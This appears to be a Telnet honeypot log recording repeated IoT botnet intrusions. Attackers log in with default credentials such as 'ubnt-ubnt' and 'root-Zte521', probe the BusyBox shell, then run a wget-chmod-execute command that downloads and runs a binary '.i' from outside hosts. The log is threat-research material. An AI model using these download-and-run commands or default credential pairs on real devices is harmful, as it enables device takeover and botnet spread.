+.i                    58% |******************             | 46720   0:00:01 ETA
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-25 23:25:05,009 - __main__ - INFO - 
+2017-02-25 23:25:05,154 - __main__ - INFO - 
+2017-02-25 23:25:06,652 - __main__ - INFO - 104.7.14.91:35914: 'exit'
+2017-02-25 23:25:06,734 - __main__ - INFO - 
+2017-02-25 23:25:06,734 - __main__ - INFO - Lost connection to 104.7.14.91:35914
+2017-02-26 00:13:14,393 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-26 00:15:26,916 - __main__ - INFO - Opened connection to 171.224.215.219:45653
+2017-02-26 00:15:44,475 - __main__ - INFO - Opened connection to 77.35.124.177:60642
+2017-02-26 00:15:55,353 - __main__ - INFO - Opened connection to 186.59.37.73:39316
+2017-02-26 00:16:01,415 - __main__ - INFO - Lost connection to 171.224.215.219:45653
+2017-02-26 00:16:14,708 - __main__ - INFO - Opened connection to 175.194.209.187:4912
+2017-02-26 00:16:15,294 - __main__ - INFO - 175.194.209.187:4912 logged in as ubnt-ubnt
+2017-02-26 00:16:15,444 - __main__ - INFO - 175.194.209.187:4912: 'enable'
+2017-02-26 00:16:15,508 - __main__ - INFO - /bin/sh: enable: not found
+
+2017-02-26 00:16:15,509 - __main__ - INFO - 175.194.209.187:4912: 'shell'
+2017-02-26 00:16:15,509 - __main__ - INFO - 175.194.209.187:4912: 'sh'
+2017-02-26 00:16:15,659 - __main__ - INFO - 175.194.209.187:4912: 'cat /proc/mounts; /bin/busybox UDUSI'
+2017-02-26 00:16:15,721 - __main__ - INFO - 
+tmpfs /var tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k 0 0
+sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
+proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
+udev /dev devtmpfs rw,relatime,size=289396k,nr_inodes=72349,mode=755 0 0
+
+2017-02-26 00:16:15,785 - __main__ - INFO - UDUSI: applet not found
+
+2017-02-26 00:16:15,839 - __main__ - INFO - Lost connection to 77.35.124.177:60642
+2017-02-26 00:16:15,997 - __main__ - INFO - 175.194.209.187:4912: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox UDUSI'
+2017-02-26 00:16:16,197 - __main__ - INFO - cat: can't open '.s': No such file or directory
+
+2017-02-26 00:16:16,255 - __main__ - INFO - 
+2017-02-26 00:16:16,313 - __main__ - INFO - UDUSI: applet not found
+
+2017-02-26 00:16:16,464 - __main__ - INFO - 175.194.209.187:4912: 'nc; wget; /bin/busybox UDUSI'
+2017-02-26 00:16:16,521 - __main__ - INFO - BusyBox v1.26.2 (2017-01-12 18:09:33 UTC) multi-call binary.
+
+Usage: wget [-c|--continue] [--spider] [-q|--quiet] [-O|--output-document FILE]
+	[--header 'header: value'] [-Y|--proxy on/off] [-P DIR]
+	[-U|--user-agent AGENT] [-T SEC] URL...
+
+Retrieve files via HTTP or FTP
+
+	--spider	Spider mode - only check file existence
+	-c		Continue retrieval of aborted transfer
+	-q		Quiet
+	-P DIR		Save to DIR (default .)
+	-T SEC		Network read timeout is SEC seconds
+	-O FILE		Save to FILE ('-' for stdout)
+	-U STR		Use STR for User-Agent header
+	-Y on/off	Use proxy
+
+2017-02-26 00:16:16,570 - __main__ - INFO - UDUSI: applet not found
+
+2017-02-26 00:16:16,721 - __main__ - INFO - 175.194.209.187:4912: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-26 00:16:16,721 - __main__ - INFO - ELF          (    ¼ 4   TR   4   	 (   
+2017-02-26 00:16:16,722 - __main__ - INFO - +10 records in
+1+0 records out
+
+2017-02-26 00:16:16,871 - __main__ - INFO - 175.194.209.187:4912: '/bin/busybox UDUSI'
+2017-02-26 00:16:16,928 - __main__ - INFO - UDUSI: applet not found
+
+2017-02-26 00:16:17,059 - __main__ - INFO - 175.194.209.187:4912: 'rm .s; wget http://79.107.148.189:2534/.i; chmod +x .i; ./.i; exit'
+2017-02-26 00:16:17,120 - __main__ - INFO - 
+2017-02-26 00:16:19,320 - __main__ - INFO - Connecting to 79.107.148.189:2534 (79.107.148.189:2534)
+.i                    24% |*******                        | 19740   0:00:03 ETA
+.i                    98% |****************************** | 78960   0:00:00 ETA
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-26 00:16:19,377 - __main__ - INFO - 
+2017-02-26 00:16:19,505 - __main__ - INFO - 
+2017-02-26 00:16:19,506 - __main__ - INFO - 175.194.209.187:4912: 'q'
+2017-02-26 00:16:19,565 - __main__ - INFO - /bin/sh: q: not found
+
+2017-02-26 00:16:28,568 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-26 00:19:42,118 - __main__ - INFO - Opened connection to 111.34.23.69:31843
+2017-02-26 00:20:02,660 - __main__ - INFO - Lost connection to 111.34.23.69:31843
+2017-02-26 00:20:02,849 - __main__ - INFO - Opened connection to 111.34.23.69:31947
+2017-02-26 00:20:03,569 - __main__ - INFO - 111.34.23.69:31947 logged in as root-pass
+2017-02-26 00:20:03,765 - __main__ - INFO - 111.34.23.69:31947: 'enable'
+2017-02-26 00:20:03,827 - __main__ - INFO - /bin/sh: enable: not found
+
+2017-02-26 00:20:03,828 - __main__ - INFO - 111.34.23.69:31947: 'shell'
+2017-02-26 00:20:03,828 - __main__ - INFO - 111.34.23.69:31947: 'sh'
+2017-02-26 00:20:04,023 - __main__ - INFO - 111.34.23.69:31947: 'cat /proc/mounts; /bin/busybox OSCOU'
+2017-02-26 00:20:04,085 - __main__ - INFO - 
+tmpfs /var tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k 0 0
+sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
+proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
+udev /dev devtmpfs rw,relatime,size=289396k,nr_inodes=72349,mode=755 0 0
+
+2017-02-26 00:20:04,145 - __main__ - INFO - OSCOU: applet not found
+
+2017-02-26 00:20:04,448 - __main__ - INFO - 111.34.23.69:31947: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox OSCOU'
+2017-02-26 00:20:04,586 - __main__ - INFO - cat: can't open '.s': No such file or directory
+
+2017-02-26 00:20:04,651 - __main__ - INFO - 
+2017-02-26 00:20:04,717 - __main__ - INFO - OSCOU: applet not found
+
+2017-02-26 00:20:04,913 - __main__ - INFO - 111.34.23.69:31947: 'nc; wget; /bin/busybox OSCOU'
+2017-02-26 00:20:04,978 - __main__ - INFO - BusyBox v1.26.2 (2017-01-12 18:09:33 UTC) multi-call binary.
+
+Usage: wget [-c|--continue] [--spider] [-q|--quiet] [-O|--output-document FILE]
+	[--header 'header: value'] [-Y|--proxy on/off] [-P DIR]
+	[-U|--user-agent AGENT] [-T SEC] URL...
+
+Retrieve files via HTTP or FTP
+
+	--spider	Spider mode - only check file existence
+	-c		Continue retrieval of aborted transfer
+	-q		Quiet
+	-P DIR		Save to DIR (default .)
+	-T SEC		Network read timeout is SEC seconds
+	-O FILE		Save to FILE ('-' for stdout)
+	-U STR		Use STR for User-Agent header
+	-Y on/off	Use proxy
+
+2017-02-26 00:20:05,061 - __main__ - INFO - OSCOU: applet not found
+
+2017-02-26 00:20:05,264 - __main__ - INFO - 111.34.23.69:31947: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-26 00:20:05,265 - __main__ - INFO - ELF          (    ¼ 4   TR   4   	 (   
+2017-02-26 00:20:05,265 - __main__ - INFO - +10 records in
+1+0 records out
+
+2017-02-26 00:20:05,460 - __main__ - INFO - 111.34.23.69:31947: '/bin/busybox OSCOU'
+2017-02-26 00:20:05,551 - __main__ - INFO - OSCOU: applet not found
+
+2017-02-26 00:20:05,692 - __main__ - INFO - 111.34.23.69:31947: 'rm .s; wget http://179.189.163.172:27133/.i; chmod +x .i; ./.i; exit'
+2017-02-26 00:20:05,777 - __main__ - INFO - 
+2017-02-26 00:20:07,671 - __main__ - INFO - Connecting to 179.189.163.172:27133 (179.189.163.172:27133)
+.i                    96% |*****************************  | 77380   0:00:00 ETA
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-26 00:20:07,734 - __main__ - INFO - 
+2017-02-26 00:20:07,857 - __main__ - INFO - 
+2017-02-26 00:20:07,857 - __main__ - INFO - 111.34.23.69:31947: 'q'
+2017-02-26 00:20:07,922 - __main__ - INFO - /bin/sh: q: not found
+
+2017-02-26 00:21:11,979 - __main__ - INFO - Saving file /var with md5sum md5sum: from 111.34.23.69:31947
+2017-02-26 00:21:12,067 - __main__ - INFO - Saving file /var/.i with md5sum 2e9dd2e43e866a26c44ceccc129e0c52 from 111.34.23.69:31947
+2017-02-26 00:21:17,178 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-26 00:21:31,854 - __main__ - INFO - Opened connection to 37.210.245.154:47815
+2017-02-26 00:21:32,682 - __main__ - INFO - 37.210.245.154:47815 logged in as mother-fucker
+2017-02-26 00:21:32,941 - __main__ - INFO - 37.210.245.154:47815: 'enable'
+2017-02-26 00:21:33,005 - __main__ - INFO - /bin/sh: enable: not found
+
+2017-02-26 00:21:33,005 - __main__ - INFO - 37.210.245.154:47815: 'shell'
+2017-02-26 00:21:33,005 - __main__ - INFO - 37.210.245.154:47815: 'sh'
+2017-02-26 00:21:33,263 - __main__ - INFO - 37.210.245.154:47815: 'cat /proc/mounts; /bin/busybox WWCCU'
+2017-02-26 00:21:33,311 - __main__ - INFO - 
+tmpfs /var tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k 0 0
+sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
+proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
+udev /dev devtmpfs rw,relatime,size=289396k,nr_inodes=72349,mode=755 0 0
+
+2017-02-26 00:21:33,369 - __main__ - INFO - WWCCU: applet not found
+
+2017-02-26 00:21:33,813 - __main__ - INFO - 37.210.245.154:47815: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox WWCCU'
+2017-02-26 00:21:33,937 - __main__ - INFO - cat: can't open '.s': No such file or directory
+
+2017-02-26 00:21:34,000 - __main__ - INFO - 
+2017-02-26 00:21:34,060 - __main__ - INFO - WWCCU: applet not found
+
+2017-02-26 00:21:34,954 - __main__ - INFO - 37.210.245.154:47815: 'nc; wget; /bin/busybox WWCCU'
+2017-02-26 00:21:35,018 - __main__ - INFO - BusyBox v1.26.2 (2017-01-12 18:09:33 UTC) multi-call binary.
+
+Usage: wget [-c|--continue] [--spider] [-q|--quiet] [-O|--output-document FILE]
+	[--header 'header: value'] [-Y|--proxy on/off] [-P DIR]
+	[-U|--user-agent AGENT] [-T SEC] URL...
+
+Retrieve files via HTTP or FTP
+
+	--spider	Spider mode - only check file existence
+	-c		Continue retrieval of aborted transfer
+	-q		Quiet
+	-P DIR		Save to DIR (default .)
+	-T SEC		Network read timeout is SEC seconds
+	-O FILE		Save to FILE ('-' for stdout)
+	-U STR		Use STR for User-Agent header
+	-Y on/off	Use proxy
+
+2017-02-26 00:21:35,076 - __main__ - INFO - WWCCU: applet not found
+
+2017-02-26 00:21:35,934 - __main__ - INFO - 37.210.245.154:47815: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-26 00:21:35,934 - __main__ - INFO - ELF          (    ¼ 4   TR   4   	 (   
+2017-02-26 00:21:35,935 - __main__ - INFO - +10 records in
+1+0 records out
+
+2017-02-26 00:21:36,191 - __main__ - INFO - 37.210.245.154:47815: '/bin/busybox WWCCU'
+2017-02-26 00:21:36,238 - __main__ - INFO - WWCCU: applet not found
+
+2017-02-26 00:21:36,487 - __main__ - INFO - 37.210.245.154:47815: 'rm .s; wget http://62.121.127.233:9503/.i; chmod +x .i; ./.i; exit'
+2017-02-26 00:21:36,547 - __main__ - INFO - 
+2017-02-26 00:21:37,513 - __main__ - INFO - Connecting to 62.121.127.233:9503 (62.121.127.233:9503)
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-26 00:21:37,592 - __main__ - INFO - 
+2017-02-26 00:21:37,711 - __main__ - INFO - 
+2017-02-26 00:21:37,711 - __main__ - INFO - 37.210.245.154:47815: 'q'
+2017-02-26 00:21:37,772 - __main__ - INFO - /bin/sh: q: not found
+
+2017-02-26 00:22:13,845 - __main__ - INFO - Saving file /var with md5sum md5sum: from 37.210.245.154:47815
+2017-02-26 00:22:13,936 - __main__ - INFO - Saving file /var/.i with md5sum 2e9dd2e43e866a26c44ceccc129e0c52 from 37.210.245.154:47815
+2017-02-26 00:22:16,112 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-26 00:23:04,466 - __main__ - INFO - Opened connection to 151.76.63.118:53155
+2017-02-26 00:23:05,814 - __main__ - INFO - 151.76.63.118:53155 logged in as root-Zte521
+2017-02-26 00:23:05,994 - __main__ - INFO - 151.76.63.118:53155: 'enable'
+2017-02-26 00:23:06,054 - __main__ - INFO - /bin/sh: enable: not found
+
+2017-02-26 00:23:06,054 - __main__ - INFO - 151.76.63.118:53155: 'shell'
+2017-02-26 00:23:06,054 - __main__ - INFO - 151.76.63.118:53155: 'sh'
+2017-02-26 00:23:06,235 - __main__ - INFO - 151.76.63.118:53155: 'cat /proc/mounts; /bin/busybox FHVEI'
+2017-02-26 00:23:06,291 - __main__ - INFO - 
+tmpfs /var tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k 0 0
+sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
+proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
+udev /dev devtmpfs rw,relatime,size=289396k,nr_inodes=72349,mode=755 0 0
+
+2017-02-26 00:23:06,351 - __main__ - INFO - FHVEI: applet not found
+
+2017-02-26 00:23:06,635 - __main__ - INFO - 151.76.63.118:53155: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox FHVEI'
+2017-02-26 00:23:06,750 - __main__ - INFO - cat: can't open '.s': No such file or directory
+
+2017-02-26 00:23:06,807 - __main__ - INFO - 
+2017-02-26 00:23:06,867 - __main__ - INFO - FHVEI: applet not found
+
+2017-02-26 00:23:07,542 - __main__ - INFO - 151.76.63.118:53155: 'nc; wget; /bin/busybox FHVEI'
+2017-02-26 00:23:07,601 - __main__ - INFO - BusyBox v1.26.2 (2017-01-12 18:09:33 UTC) multi-call binary.
+
+Usage: wget [-c|--continue] [--spider] [-q|--quiet] [-O|--output-document FILE]
+	[--header 'header: value'] [-Y|--proxy on/off] [-P DIR]
+	[-U|--user-agent AGENT] [-T SEC] URL...
+
+Retrieve files via HTTP or FTP
+
+	--spider	Spider mode - only check file existence
+	-c		Continue retrieval of aborted transfer
+	-q		Quiet
+	-P DIR		Save to DIR (default .)
+	-T SEC		Network read timeout is SEC seconds
+	-O FILE		Save to FILE ('-' for stdout)
+	-U STR		Use STR for User-Agent header
+	-Y on/off	Use proxy
+
+2017-02-26 00:23:07,659 - __main__ - INFO - FHVEI: applet not found
+
+2017-02-26 00:23:07,845 - __main__ - INFO - 151.76.63.118:53155: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-26 00:23:07,845 - __main__ - INFO - ELF          (    ¼ 4   TR   4   	 (   
+2017-02-26 00:23:07,846 - __main__ - INFO - +10 records in
+1+0 records out
+
+2017-02-26 00:23:08,060 - __main__ - INFO - 151.76.63.118:53155: '/bin/busybox FHVEI'
+2017-02-26 00:23:08,122 - __main__ - INFO - FHVEI: applet not found
+
+2017-02-26 00:23:08,278 - __main__ - INFO - 151.76.63.118:53155: 'rm .s; wget http://179.199.216.101:39667/.i; chmod +x .i; ./.i; exit'
+2017-02-26 00:23:08,341 - __main__ - INFO - 
+2017-02-26 00:23:09,698 - __main__ - INFO - Connecting to 179.199.216.101:39667 (179.199.216.101:39667)
+.i                    19% |******                         | 15972   0:00:04 ETA
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-26 00:23:09,756 - __main__ - INFO - 
+2017-02-26 00:23:09,874 - __main__ - INFO - 
+2017-02-26 00:23:09,874 - __main__ - INFO - 151.76.63.118:53155: 'q'
+2017-02-26 00:23:09,933 - __main__ - INFO - /bin/sh: q: not found
+
+2017-02-26 00:24:48,005 - __main__ - INFO - Lost connection to 151.76.63.118:53155
+2017-02-26 00:25:14,315 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-26 00:25:55,419 - __main__ - INFO - Opened connection to 87.248.85.123:34938
+2017-02-26 00:25:56,094 - __main__ - INFO - 87.248.85.123:34938 logged in as root-1234
+2017-02-26 00:25:56,264 - __main__ - INFO - 87.248.85.123:34938: 'enable'
+2017-02-26 00:25:56,327 - __main__ - INFO - /bin/sh: enable: not found
+
+2017-02-26 00:25:56,328 - __main__ - INFO - 87.248.85.123:34938: 'shell'
+2017-02-26 00:25:56,328 - __main__ - INFO - 87.248.85.123:34938: 'sh'
+2017-02-26 00:25:56,502 - __main__ - INFO - 87.248.85.123:34938: 'cat /proc/mounts; /bin/busybox GNRWD'
+2017-02-26 00:25:56,556 - __main__ - INFO - 
+tmpfs /var tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k 0 0
+sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
+proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
+udev /dev devtmpfs rw,relatime,size=289396k,nr_inodes=72349,mode=755 0 0
+
+2017-02-26 00:25:56,616 - __main__ - INFO - GNRWD: applet not found
+
+2017-02-26 00:25:56,874 - __main__ - INFO - 87.248.85.123:34938: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox GNRWD'
+2017-02-26 00:25:57,009 - __main__ - INFO - cat: can't open '.s': No such file or directory
+
+2017-02-26 00:25:57,068 - __main__ - INFO - 
+2017-02-26 00:25:57,127 - __main__ - INFO - GNRWD: applet not found
+
+2017-02-26 00:25:57,298 - __main__ - INFO - 87.248.85.123:34938: 'nc; wget; /bin/busybox GNRWD'
+2017-02-26 00:25:57,352 - __main__ - INFO - BusyBox v1.26.2 (2017-01-12 18:09:33 UTC) multi-call binary.
+
+Usage: wget [-c|--continue] [--spider] [-q|--quiet] [-O|--output-document FILE]
+	[--header 'header: value'] [-Y|--proxy on/off] [-P DIR]
+	[-U|--user-agent AGENT] [-T SEC] URL...
+
+Retrieve files via HTTP or FTP
+
+	--spider	Spider mode - only check file existence
+	-c		Continue retrieval of aborted transfer
+	-q		Quiet
+	-P DIR		Save to DIR (default .)
+	-T SEC		Network read timeout is SEC seconds
+	-O FILE		Save to FILE ('-' for stdout)
+	-U STR		Use STR for User-Agent header
+	-Y on/off	Use proxy
+
+2017-02-26 00:25:57,422 - __main__ - INFO - GNRWD: applet not found
+
+2017-02-26 00:25:57,594 - __main__ - INFO - 87.248.85.123:34938: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-26 00:25:57,595 - __main__ - INFO - ELF          (    ¼ 4   TR   4   	 (   
+2017-02-26 00:25:57,595 - __main__ - INFO - +10 records in
+1+0 records out
+
+2017-02-26 00:25:57,764 - __main__ - INFO - 87.248.85.123:34938: '/bin/busybox GNRWD'
+2017-02-26 00:25:57,824 - __main__ - INFO - GNRWD: applet not found
+
+2017-02-26 00:25:57,971 - __main__ - INFO - 87.248.85.123:34938: 'rm .s; wget http://87.248.85.123:1160/.i; chmod +x .i; ./.i; exit'
+2017-02-26 00:25:58,029 - __main__ - INFO - 
+2017-02-26 00:25:58,800 - __main__ - INFO - Connecting to 87.248.85.123:1160 (87.248.85.123:1160)
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-26 00:25:58,860 - __main__ - INFO - 
+2017-02-26 00:25:58,980 - __main__ - INFO - 
+2017-02-26 00:25:58,980 - __main__ - INFO - 87.248.85.123:34938: 'q'
+2017-02-26 00:25:59,030 - __main__ - INFO - /bin/sh: q: not found
+
+2017-02-26 00:26:05,574 - __main__ - INFO - Saving file /var with md5sum md5sum: from 87.248.85.123:34938
+2017-02-26 00:26:05,677 - __main__ - INFO - Saving file /var/.i with md5sum 2e9dd2e43e866a26c44ceccc129e0c52 from 87.248.85.123:34938
+2017-02-26 00:26:44,226 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-26 00:27:46,408 - __main__ - INFO - Opened connection to 123.110.47.136:3482
+2017-02-26 00:28:02,430 - __main__ - INFO - Opened connection to 202.101.129.165:4196
+2017-02-26 00:28:07,845 - __main__ - INFO - Opened connection to 186.92.247.39:49407
+2017-02-26 00:28:18,077 - __main__ - INFO - Lost connection to 123.110.47.136:3482
+2017-02-26 00:28:33,702 - __main__ - INFO - Lost connection to 202.101.129.165:4196
+2017-02-26 00:28:38,542 - __main__ - INFO - Lost connection to 186.92.247.39:49407
+2017-02-26 00:28:50,746 - __main__ - INFO - Opened connection to 114.35.167.20:42671
+2017-02-26 00:28:51,431 - __main__ - INFO - 114.35.167.20:42671 logged in as 666666-666666
+2017-02-26 00:28:51,587 - __main__ - INFO - 114.35.167.20:42671: 'enable'
+2017-02-26 00:28:51,648 - __main__ - INFO - /bin/sh: enable: not found
+
+2017-02-26 00:28:51,649 - __main__ - INFO - 114.35.167.20:42671: 'shell'
+2017-02-26 00:28:51,649 - __main__ - INFO - 114.35.167.20:42671: 'sh'
+2017-02-26 00:28:51,806 - __main__ - INFO - 114.35.167.20:42671: 'cat /proc/mounts; /bin/busybox EYQPW'
+2017-02-26 00:28:51,870 - __main__ - INFO - 
+tmpfs /var tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k 0 0
+sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
+proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
+udev /dev devtmpfs rw,relatime,size=289396k,nr_inodes=72349,mode=755 0 0
+
+2017-02-26 00:28:51,919 - __main__ - INFO - EYQPW: applet not found
+
+2017-02-26 00:28:52,168 - __main__ - INFO - 114.35.167.20:42671: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox EYQPW'
+2017-02-26 00:28:52,284 - __main__ - INFO - cat: can't open '.s': No such file or directory
+
+2017-02-26 00:28:52,350 - __main__ - INFO - 
+2017-02-26 00:28:52,409 - __main__ - INFO - EYQPW: applet not found
+
+2017-02-26 00:28:52,565 - __main__ - INFO - 114.35.167.20:42671: 'nc; wget; /bin/busybox EYQPW'
+2017-02-26 00:28:52,623 - __main__ - INFO - BusyBox v1.26.2 (2017-01-12 18:09:33 UTC) multi-call binary.
+
+Usage: wget [-c|--continue] [--spider] [-q|--quiet] [-O|--output-document FILE]
+	[--header 'header: value'] [-Y|--proxy on/off] [-P DIR]
+	[-U|--user-agent AGENT] [-T SEC] URL...
+
+Retrieve files via HTTP or FTP
+
+	--spider	Spider mode - only check file existence
+	-c		Continue retrieval of aborted transfer
+	-q		Quiet
+	-P DIR		Save to DIR (default .)
+	-T SEC		Network read timeout is SEC seconds
+	-O FILE		Save to FILE ('-' for stdout)
+	-U STR		Use STR for User-Agent header
+	-Y on/off	Use proxy
+
+2017-02-26 00:28:52,680 - __main__ - INFO - EYQPW: applet not found
+
+2017-02-26 00:28:52,837 - __main__ - INFO - 114.35.167.20:42671: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-26 00:28:52,838 - __main__ - INFO - ELF          (    ¼ 4   TR   4   	 (   
+2017-02-26 00:28:52,838 - __main__ - INFO - +10 records in
+1+0 records out
+
+2017-02-26 00:28:52,994 - __main__ - INFO - 114.35.167.20:42671: '/bin/busybox EYQPW'
+2017-02-26 00:28:53,112 - __main__ - INFO - EYQPW: applet not found
+
+2017-02-26 00:28:53,189 - __main__ - INFO - 114.35.167.20:42671: 'rm .s; wget http://114.35.167.20:51012/.i; chmod +x .i; ./.i; exit'
+2017-02-26 00:28:53,247 - __main__ - INFO - 
+2017-02-26 00:28:54,205 - __main__ - INFO - Connecting to 114.35.167.20:51012 (114.35.167.20:51012)
+.i                    61% |*******************            | 49420   0:00:00 ETA
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-26 00:28:54,265 - __main__ - INFO - 
+2017-02-26 00:28:54,380 - __main__ - INFO - 
+2017-02-26 00:28:54,380 - __main__ - INFO - 114.35.167.20:42671: 'q'
+2017-02-26 00:28:54,437 - __main__ - INFO - /bin/sh: q: not found
+
+2017-02-26 00:29:08,222 - __main__ - INFO - Saving file /var with md5sum md5sum: from 114.35.167.20:42671
+2017-02-26 00:29:08,316 - __main__ - INFO - Saving file /var/.i with md5sum 2e9dd2e43e866a26c44ceccc129e0c52 from 114.35.167.20:42671
+2017-02-26 00:29:12,404 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-26 00:30:22,717 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-26 00:31:11,467 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-26 00:34:00,822 - __main__ - INFO - Opened connection to 115.112.116.69:35072
+2017-02-26 00:34:01,722 - __main__ - INFO - 115.112.116.69:35072 logged in as 888888-888888
+2017-02-26 00:34:02,206 - __main__ - INFO - 115.112.116.69:35072: 'enable'
+2017-02-26 00:34:02,273 - __main__ - INFO - /bin/sh: enable: not found
+
+2017-02-26 00:34:02,273 - __main__ - INFO - 115.112.116.69:35072: 'shell'
+2017-02-26 00:34:02,273 - __main__ - INFO - 115.112.116.69:35072: 'sh'
+2017-02-26 00:34:02,563 - __main__ - INFO - 115.112.116.69:35072: 'cat /proc/mounts; /bin/busybox WDHJV'
+2017-02-26 00:34:02,623 - __main__ - INFO - 
+tmpfs /var tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k 0 0
+sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
+proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
+udev /dev devtmpfs rw,relatime,size=289396k,nr_inodes=72349,mode=755 0 0
+
+2017-02-26 00:34:02,706 - __main__ - INFO - WDHJV: applet not found
+
+2017-02-26 00:34:03,193 - __main__ - INFO - 115.112.116.69:35072: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox WDHJV'
+2017-02-26 00:34:03,311 - __main__ - INFO - cat: can't open '.s': No such file or directory
+
+2017-02-26 00:34:03,375 - __main__ - INFO - 
+2017-02-26 00:34:03,423 - __main__ - INFO - WDHJV: applet not found
+
+2017-02-26 00:34:03,710 - __main__ - INFO - 115.112.116.69:35072: 'nc; wget; /bin/busybox WDHJV'
+2017-02-26 00:34:03,784 - __main__ - INFO - BusyBox v1.26.2 (2017-01-12 18:09:33 UTC) multi-call binary.
+
+Usage: wget [-c|--continue] [--spider] [-q|--quiet] [-O|--output-document FILE]
+	[--header 'header: value'] [-Y|--proxy on/off] [-P DIR]
+	[-U|--user-agent AGENT] [-T SEC] URL...
+
+Retrieve files via HTTP or FTP
+
+	--spider	Spider mode - only check file existence
+	-c		Continue retrieval of aborted transfer
+	-q		Quiet
+	-P DIR		Save to DIR (default .)
+	-T SEC		Network read timeout is SEC seconds
+	-O FILE		Save to FILE ('-' for stdout)
+	-U STR		Use STR for User-Agent header
+	-Y on/off	Use proxy
+
+2017-02-26 00:34:03,853 - __main__ - INFO - WDHJV: applet not found
+
+2017-02-26 00:34:04,143 - __main__ - INFO - 115.112.116.69:35072: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-26 00:34:04,144 - __main__ - INFO - ELF          (    ¼ 4   TR   4   	 (   
+2017-02-26 00:34:04,144 - __main__ - INFO - +10 records in
+1+0 records out
+
+2017-02-26 00:34:04,427 - __main__ - INFO - 115.112.116.69:35072: '/bin/busybox WDHJV'
+2017-02-26 00:34:04,487 - __main__ - INFO - WDHJV: applet not found
+
+2017-02-26 00:34:04,755 - __main__ - INFO - 115.112.116.69:35072: 'rm .s; wget http://1.52.225.121:24275/.i; chmod +x .i; ./.i; exit'
+2017-02-26 00:34:04,811 - __main__ - INFO - 
+2017-02-26 00:34:06,073 - __main__ - INFO - Connecting to 1.52.225.121:24275 (1.52.225.121:24275)
+.i                   100% |*******************************| 80144   0:00:00 ETA
+
+
+2017-02-26 00:34:06,132 - __main__ - INFO - 
+2017-02-26 00:34:06,253 - __main__ - INFO - 
+2017-02-26 00:34:06,254 - __main__ - INFO - 115.112.116.69:35072: 'q'
+2017-02-26 00:34:06,313 - __main__ - INFO - /bin/sh: q: not found
+
+2017-02-26 00:34:54,125 - __main__ - INFO - Opened connection to 171.234.1.131:46557
+2017-02-26 00:34:54,832 - __main__ - INFO - 171.234.1.131:46557 logged in as mother-fucker
+2017-02-26 00:34:55,016 - __main__ - INFO - 171.234.1.131:46557: 'enable'
+2017-02-26 00:34:55,131 - __main__ - INFO - /bin/sh: enable: not found
+
+2017-02-26 00:34:55,131 - __main__ - INFO - 171.234.1.131:46557: 'shell'
+2017-02-26 00:34:55,131 - __main__ - INFO - 171.234.1.131:46557: 'sh'
+2017-02-26 00:34:55,312 - __main__ - INFO - 171.234.1.131:46557: 'cat /proc/mounts; /bin/busybox KKDYJ'
+2017-02-26 00:34:55,371 - __main__ - INFO - 
+tmpfs /var tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k 0 0
+sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
+proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
+udev /dev devtmpfs rw,relatime,size=289396k,nr_inodes=72349,mode=755 0 0
+
+2017-02-26 00:34:55,431 - __main__ - INFO - KKDYJ: applet not found
+
+2017-02-26 00:34:56,252 - __main__ - INFO - 171.234.1.131:46557: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox KKDYJ'
+2017-02-26 00:34:56,377 - __main__ - INFO - cat: can't open '.s': No such file or directory
+
+2017-02-26 00:34:56,437 - __main__ - INFO - 
+2017-02-26 00:34:56,494 - __main__ - INFO - KKDYJ: applet not found
+
